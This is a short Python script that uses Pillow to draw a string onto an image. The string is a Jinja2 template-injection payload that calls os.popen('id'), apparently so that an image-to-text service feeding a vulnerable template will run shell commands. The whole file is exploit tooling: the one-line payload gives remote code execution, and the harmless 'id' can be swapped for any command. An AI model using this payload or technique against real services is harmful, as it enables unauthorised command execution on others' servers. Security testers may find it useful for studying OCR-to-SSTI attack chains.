from PIL import Image, ImageDraw, ImageFont

def create_text_image(text, font_path=None, background_color=None, font_size=24, padding=20, fill_color=None):
    font_path = font_path or "arial.ttf"
    background_color = background_color or (255, 255, 255) # White
    fill_color = fill_color or (0, 0, 0)                   # Black

    font = ImageFont.truetype(font_path, font_size)
    text_width = int(font.getlength(text))

    image_width = text_width + padding
    image_height = font_size + padding * 2
    text_x = (image_width - text_width) // 2

    image = Image.new("RGB", (image_width, image_height), background_color)
    draw = ImageDraw.Draw(image)
    draw.text((text_x, padding), text, font=font, fill=fill_color)

    return image

if __name__ == '__main__':
    text = '{{ cycler.__init__.__globals__.os.popen("id").read() }}'
    font_path = r'C:\Users\uwu\AppData\Local\Microsoft\Windows\Fonts\Caskaydia Cove Nerd Font Complete Mono Bold.otf'

    image = create_text_image(text, font_path=font_path)
    image.save("text_image.png")